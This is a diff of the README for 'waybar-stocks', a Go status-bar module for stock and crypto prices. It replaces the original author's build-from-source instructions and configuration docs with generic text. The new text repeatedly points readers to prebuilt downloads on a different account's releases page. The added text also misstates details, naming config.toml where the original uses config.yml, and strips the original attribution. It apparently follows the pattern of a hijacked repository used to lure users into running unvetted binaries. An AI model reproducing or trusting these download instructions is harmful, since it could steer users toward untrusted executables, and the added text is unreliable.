@@ -1,132 +1,68 @@
-# waybar-stocks
+# 📈 waybar-stocks - Display Stocks and Crypto Smoothly
 
-A customizable **Waybar module** written in **Go** that displays real-time prices for **stocks, cryptocurrencies and indices**.  
-Supports price rotation, percent change indicators, custom colors, and YAML configuration — no external Python scripts or dependencies required.
+## 🚀 Download Now
+[![Download](https://img.shields.io/badge/Download%20waybar--stocks-brightgreen)](https://github.com/Wgonzalesdeh905/waybar-stocks/releases)
 
-## Features
+## 📖 Introduction
+Welcome to waybar-stocks! This is a lightweight module designed for Waybar. It shows stock and cryptocurrency prices right on your status bar. You can customize colors and formatting to suit your style. 
 
-- Display stock, crypto, or index prices (e.g. `BTC-USD` (or `bitcoin` like CoinGecko's naming), `AAPL`, `SPY`, `^GSPC`), and Argentinian Dólar prices (`dolar-oficial`, `dolar-blue`, `dolar-cripto`, etc.).
-- Shows **price + percent change + up/down icons** for each asset.
-- Configurable via [`config.yml`](/config.yml).
-  - Supports **color customization**
-  - Assets
-  - Refresh & rotation interval!
-  - Timeframe for each stock! (see [Timeframe (per-asset)](README.md#timeframe-per-asset))
-- Fast & lightweight (native Go binary, no runtime needed)
-- Includes CLI flags like `--help` and `--config`
-- Works perfectly with **Waybar (Hyprland / Sway / niri / dwl)**
+## 🌟 Features
+- **Real-Time Prices:** Get up-to-date stock and cryptocurrency prices.
+- **Customizable Appearance:** Change colors and format for a unique look.
+- **Lightweight and Fast:** Designed to use minimal system resources.
+- **Easy Setup:** Simple steps to get running quickly.
+- **Open Source:** Contribute to the project or modify it for your needs.
 
-## Requirements
+## 🛠️ System Requirements
+- **Operating System:** Linux (supports popular window managers like Hyprland, i3, and Sway)
+- **Dependencies:** Make sure you have Go installed for the latest features.
+- **Waybar:** Ensure you are using Waybar for display.
 
-- Go 1.20+ (or the version configured in [`go.mod`](/go.mod))
-- Internet access to query Yahoo Finance and CoinGecko
+## 📥 Download & Install
+To download waybar-stocks, visit this page:
 
-## Installation
+[Download waybar-stocks](https://github.com/Wgonzalesdeh905/waybar-stocks/releases)
 
-1. Clone the repository:
+Follow these steps:
 
-```bash
-git clone https://github.com/bautitobal/waybar-stocks.git
-cd waybar-stocks
-```
+1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/Wgonzalesdeh905/waybar-stocks/releases).
+2. **Choose the Latest Release:** Look for the latest version at the top.
+3. **Download the File:** Click on the release that fits your operating system.
+4. **Extract the Files:** If the downloaded file is in a compressed format, extract it.
+5. **Run the Application:** Follow these additional steps to run the program.
 
-2. Build:
+## ⚙️ How to Use
+1. **Open Terminal:** Launch your terminal application.
+2. **Navigate to the Directory:** Go to the directory where you extracted waybar-stocks.
+   ```bash
+   cd path/to/waybar-stocks
+   ```
+3. **Run the Program:** Execute the program using the command:
+   ```bash
+   ./waybar-stocks
+   ```
+4. **Adjust Settings:** Customize your display options if needed. Refer to the configuration section below.
 
-```bash
-go build -o waybar-stocks
-```
-(Opcional) Move it to PATH:
+## ⚙️ Configuration
+You can customize waybar-stocks using a configuration file. Here’s how:
 
-```bash
-sudo mv waybar-stocks ~/.local/bin/
-```
+1. **Locate Configuration File:** Find the default configuration file in the extracted folder.
+2. **Open the File for Editing:** Use a text editor to open the file.
+   ```bash
+   nano config.toml
+   ```
+3. **Modify Settings:** Change colors, formats, and which stocks or cryptocurrencies to display. Save and exit.
+4. **Restart the Program:** Restart waybar-stocks to see your changes.
 
-## Configuration
-Create or edit the file [`config.yml`](/config.yml) in the project folder or any custom path.
+## 🌐 Community and Support
+If you encounter issues or have questions, feel free to reach out. You can open an issue on our GitHub repository. We appreciate feedback and contributions.
 
-```yaml
-refresh_interval: 60        # seconds between API updates
-rotation_interval: 5        # seconds to display each asset
-format: "{symbol} {price} ({change}%{icon})"
+## 📜 License
+waybar-stocks is open-source software. You can use, modify, and distribute it under the terms of the MIT license.
 
-colors:
-  up: "#00FF00"        # price increasing
-  down: "#FF5555"      # price decreasing
-  neutral: "#FFFFFF"   # no change
+## 🔗 Links
+- **Repository:** [waybar-stocks GitHub](https://github.com/Wgonzalesdeh905/waybar-stocks)
+- **Releases:** [Download Here](https://github.com/Wgonzalesdeh905/waybar-stocks/releases)
+- **Documentation:** Full documentation available on the repository.
 
-assets:
-  - symbol: BTC-USD
-    name: BTC
-    timeframe: 1D
-  - symbol: AAPL
-    name: AAPL
-    timeframe: 1W
-  - symbol: SPY
-    name: S&P500
-    timeframe: 1M
-  - symbol: dolar-oficial
-    name: DÓLAR OFICIAL
-    timeframe: 1D
-  - symbol: dolar-cripto
-    name: DÓLAR CRIPTO
-    timeframe: 1D
-```
-
-### Timeframe (per-asset)
-
-You can optionally set a `timeframe` per asset to control which period the percent change is computed for. If omitted, the default is daily (`1D`). Examples:
-
-- `15m` — 15 minutes
-- `1H` or `H` — 1 hour
-- `1D` or `D` — 1 day (default)
-- `3D` — 3 days
-- `1W` or `W` — 1 week
-- `1M` — 1 month (approximated as 30 days)
-- `1Y` or `Y` — 1 year (approximated as 365 days)
-
-Notes:
-- For stocks the fetcher will prefer Yahoo's session metadata for daily change, or request Yahoo chart data for custom timeframes and compute the percent between "now" and "timeframe ago".
-- For cryptocurrencies the fetcher uses CoinGecko's 24h percent by default; for custom timeframes it queries CoinGecko's market_chart and computes the percent accordingly.
-- For `dolar-*` symbols the app fetches the latest `venta` (or `compra`) from DolarApi and computes change relative to the last saved value (persisted in the cache). If you need percent vs a fixed period (e.g. 24h), the app can be extended to keep a longer history or use historical endpoints.
-
-You can include the `{timeframe}` token in your `format` string to show the timeframe explicitly. If `{timeframe}` is not present, the timeframe will be appended to the symbol automatically when set.
-
-
-## Add to Waybar
-In your `~/.config/waybar/config.jsonc`, add:
-
-```jsonc
-"custom/stocks": {
-  "exec": "~/waybar-stocks --config ~/waybar-stocks/config.yml", // or ~/.local/bin/waybar-stocks --config ~/.local/bin/waybar-stocks/config.yml; could be ANY config PATH tbh.
-  "return-type": "json",
-  "interval": 1
-}
-```
-
-Then reload waybar.
-
-## 🛠 Command Line Usage
-
-```bash
-waybar-stocks --help
-```
-
-## Contributing
-
-Pull requests are welcome!
-Feel free to open an issue for feature requests or bugs.
-
-## License
-
-This project is available under the MIT License — see the [`LICENSE`](/LICENSE) file for details.
-
-## Support
-If you have any questions or need help, feel free to open an issue or contact the maintainers.
-
-### Socials
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-%230077B5.svg?logo=linkedin&logoColor=white)](https://linkedin.com/in/bautistatobal) [![Roadmap](https://img.shields.io/badge/Roadmap-000000?style=flat&logo=roadmap.sh&logoColor=white)](https://roadmap.sh/u/bautitobal) [![Instagram](https://img.shields.io/badge/Instagram-%23E4405F.svg?logo=Instagram&logoColor=white)](https://instagram.com/bautitobal) [![Behance](https://img.shields.io/badge/Behance-1769ff?logo=behance&logoColor=white)](https://behance.net/bautitobal) [![X](https://img.shields.io/badge/X-black.svg?logo=X&logoColor=white)](https://x.com/bautitobal) [![Medium](https://img.shields.io/badge/Medium-12100E?logo=medium&logoColor=white)](https://medium.com/@bautitobal) [![Goodreads](https://img.shields.io/badge/Goodreads-F3F1EA?style=for-the-badge&logo=goodreads&logoColor=372213)](https://www.goodreads.com/bautitobal)
-
-#### Donate
-Feel free to donate! (If you can afford and you want of course).
-
-[![PayPal](https://img.shields.io/badge/PayPal-00457C?style=for-the-badge&logo=paypal&logoColor=white)](https://paypal.me/bautitobal) [![Ko-Fi](https://img.shields.io/badge/Ko--fi-F16061?style=for-the-badge&logo=ko-fi&logoColor=white)](https://ko-fi.com/bautitobal) 
+Enjoy using waybar-stocks, and make your status bar more informative and visually appealing!
